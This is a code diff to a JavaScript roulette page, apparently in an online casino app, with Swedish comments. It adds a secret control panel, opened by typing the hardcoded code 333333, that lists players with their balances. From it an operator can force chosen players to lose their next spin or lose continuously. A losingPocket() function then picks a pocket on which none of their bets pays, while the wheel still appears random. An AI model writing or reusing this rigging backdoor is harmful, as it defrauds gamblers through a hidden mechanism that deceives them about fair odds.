@@ -9,7 +9,7 @@
    ===================================================================== */
 
 import {
-  registerView, state, api, sfx, toast, kr, num, sleep, navigate, openModal, updateBalanceUI, guardRound
+  registerView, state, api, sfx, toast, kr, num, esc, sleep, navigate, openModal, updateBalanceUI, guardRound
 } from './core.js';
 import {
   currentLuck, clampLuckSetting, luckPayout, machineLuckPill, luckLevelName, settingLuck, watchLuck
@@ -53,6 +53,10 @@ export const ROULETTE_MATH = { WHEEL, RED, OUTSIDE, DOZENS, COLUMNS, PAYOUTS };
 const STEP = 360 / WHEEL.length;
 const SPIN_MS = 3200;
 
+/* Hemlig kod för roulettens kontrollpanel. Samma siffror finns på servern,
+   som avgör om en spelares nästa snurr ska tvingas till förlust. */
+const CONTROL_CODE = '333333';
+
 const game = {
   chips: new Map(), // satsnyckel → belopp
   chip: 25,
@@ -86,6 +90,25 @@ function randomPocket() {
     return v % 37;
   }
   return Math.floor(Math.random() * 37);
+}
+
+/* En ficka där ingen av spelarens marker ger något tillbaka. Har spelaren
+   täckt hela bordet finns ingen sådan – då tas fickan med minst utdelning. */
+function losingPocket(chips) {
+  const keys = [...chips.keys()];
+  const totalFor = (n) => keys.reduce((sum, key) => sum + (pays(key, n) || 0), 0);
+  const safe = WHEEL.filter((n) => totalFor(n) === 0);
+  if (safe.length) return safe[Math.floor(Math.random() * safe.length)];
+  let best = WHEEL[0];
+  let least = Infinity;
+  WHEEL.forEach((n) => {
+    const sum = totalFor(n);
+    if (sum < least) {
+      least = sum;
+      best = n;
+    }
+  });
+  return best;
 }
 
 function betTotal() {
@@ -422,8 +445,10 @@ async function spin(root) {
   updateTotals(root);
 
   // Insatsen dras innan hjulet snurrar.
+  let rig = null;
   try {
-    await api.bet('roulette', total);
+    const bet = await api.bet('roulette', total);
+    rig = bet && bet.rig;
     updateBalanceUI();
   } catch (err) {
     toast(err.message, 'bad');
@@ -433,7 +458,8 @@ async function spin(root) {
   }
   updateTotals(root);
 
-  const n = randomPocket();
+  // Kontrollpanelen kan ha tvingat fram en förlust för den här spelaren.
+  const n = rig === 'lose' ? losingPocket(game.chips) : randomPocket();
   const index = WHEEL.indexOf(n);
 
   // Snurra till rätt ficka: fem hela varv plus fram till numret.
@@ -534,6 +560,149 @@ function showInfo() {
     actions: [{ label: 'Stäng' }]
   });
 }
+
+/* ------------------------------ Kontrollrummet ------------------------------ */
+
+/* Skrivs koden 333333 på roulettesidan öppnas panelen. Ingen knapp, ingen
+   ledtråd i gränssnittet – bara den som kan koden hittar hit. */
+let controlTerm = '';
+let controlMode = 'lose';
+let codeBuffer = '';
+
+function watchControlCode() {
+  window.addEventListener('keydown', (e) => {
+    if (!state.route || state.route.name !== 'roulette') {
+      codeBuffer = '';
+      return;
+    }
+    const target = e.target;
+    if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
+      codeBuffer = '';
+      return;
+    }
+    if (!/^[0-9]$/.test(e.key || '')) {
+      codeBuffer = '';
+      return;
+    }
+    codeBuffer = (codeBuffer + e.key).slice(-CONTROL_CODE.length);
+    if (codeBuffer === CONTROL_CODE) {
+      codeBuffer = '';
+      openControl();
+    }
+  });
+}
+
+function timeAgo(ts) {
+  if (!ts) return 'aldrig inne';
+  const minutes = Math.round(Math.max(0, Date.now() - ts) / 60000);
+  if (minutes < 1) return 'nyss';
+  if (minutes < 60) return minutes + ' min sedan';
+  const hours = Math.round(minutes / 60);
+  if (hours < 24) return hours + ' tim sedan';
+  return Math.round(hours / 24) + ' dygn sedan';
+}
+
+function controlRows(players) {
+  const term = controlTerm.trim().toLowerCase();
+  const list = players.filter((p) => !term || String(p.name).toLowerCase().includes(term));
+  if (!list.length) return '<p class="small muted">Ingen spelare matchar.</p>';
+  return list
+    .map((p) => {
+      const forever = p.rig === 'loseAlways';
+      return `
+      <div class="ru-ctl__row${p.rig ? ' is-rigged' : ''}">
+        <div class="ru-ctl__who">
+          <strong>${esc(p.name)}</strong>
+          <span class="tiny muted">${kr(p.balance)} · ${num(p.rounds)} snurr · ${timeAgo(p.lastSeen)}${p.isGuest ? ' · gäst' : ''}</span>
+        </div>
+        ${p.rig ? `<span class="chip ru-ctl__flag">${forever ? 'Förlorar tills du släpper' : 'Förlorar nästa snurr'}</span>` : ''}
+        <button class="btn ${p.rig ? 'btn--ghost' : 'btn--danger'} btn--sm" data-act="${p.rig ? 'off' : controlMode}" data-id="${esc(p.id)}">
+          ${p.rig ? 'Släpp igenom' : 'Låt förlora'}
+        </button>
+      </div>`;
+    })
+    .join('');
+}
+
+async function refreshControl(backdrop) {
+  const box = backdrop.querySelector('.ru-ctl');
+  if (!box) return;
+  let data;
+  try {
+    data = await api.rouletteControl(null, CONTROL_CODE);
+  } catch (err) {
+    box.innerHTML = `<p class="small" style="color:var(--bad)">${esc(
+      err.message || 'Kunde inte hämta spelarna'
+    )} – panelen behöver servern.</p>`;
+    return;
+  }
+  const players = data.players || [];
+  const rigged = players.filter((p) => p.rig).length;
+  const log = (data.log || []).slice(0, 3);
+  box.innerHTML = `
+    <div class="ru-ctl__head">
+      <input class="input" id="ru-ctl-search" type="search" placeholder="Sök spelare…" value="${esc(controlTerm)}">
+      <span class="chip">${rigged ? rigged + ' spelare förlorar' : 'Ingen tvingas förlora'}</span>
+    </div>
+    <div class="ru-ctl__modes">
+      <button class="chip${controlMode === 'lose' ? ' is-on' : ''}" data-mode="lose">Nästa snurr</button>
+      <button class="chip${controlMode === 'loseAlways' ? ' is-on' : ''}" data-mode="loseAlways">Tills jag släpper</button>
+    </div>
+    <p class="tiny muted">Markera läget och tryck på spelaren. En tvingad förlust släpps av sig själv efter
+      ${num(data.ttlMinutes || 15)} min om spelaren inte snurrar.</p>
+    <div class="ru-ctl__list">${controlRows(players)}</div>
+    ${
+      log.length
+        ? `<p class="tiny muted" style="margin-top:10px">Senast: ${log
+            .map((l) => esc(l.playerName) + ' (' + timeAgo(l.at) + ')')
+            .join(' · ')}</p>`
+        : ''
+    }`;
+
+  const list = box.querySelector('.ru-ctl__list');
+  const search = box.querySelector('#ru-ctl-search');
+  const draw = () => {
+    list.innerHTML = controlRows(players);
+  };
+  search.addEventListener('input', () => {
+    controlTerm = search.value;
+    draw();
+  });
+  box.querySelectorAll('.ru-ctl__modes .chip').forEach((chip) => {
+    chip.addEventListener('click', () => {
+      controlMode = chip.dataset.mode === 'loseAlways' ? 'loseAlways' : 'lose';
+      box.querySelectorAll('.ru-ctl__modes .chip').forEach((c) => c.classList.toggle('is-on', c.dataset.mode === controlMode));
+      draw();
+    });
+  });
+  list.addEventListener('click', async (e) => {
+    const btn = e.target.closest('button[data-act]');
+    if (!btn || btn.disabled) return;
+    btn.disabled = true;
+    try {
+      await api.rouletteControl({ playerId: btn.dataset.id, action: btn.dataset.act }, CONTROL_CODE);
+      sfx.click();
+      await refreshControl(backdrop);
+    } catch (err) {
+      btn.disabled = false;
+      toast(err.message || 'Kunde inte ändra spelaren', 'bad');
+    }
+  });
+}
+
+function openControl() {
+  sfx.click();
+  const backdrop = openModal({
+    title: 'Roulettens kontrollrum',
+    sub: 'Bara den här maskinen. Välj en spelare och tryck – deras nästa snurr blir en förlust.',
+    wide: true,
+    body: '<div class="ru-ctl"><p class="small muted">Hämtar spelare…</p></div>',
+    actions: [{ label: 'Stäng', onClick: (close) => close() }]
+  });
+  refreshControl(backdrop);
+}
+
+watchControlCode();
 
 registerView('roulette', (root) => {
   if (!game.chip) game.chip = Math.max(1, Number(state.settings.minBet) || 10);
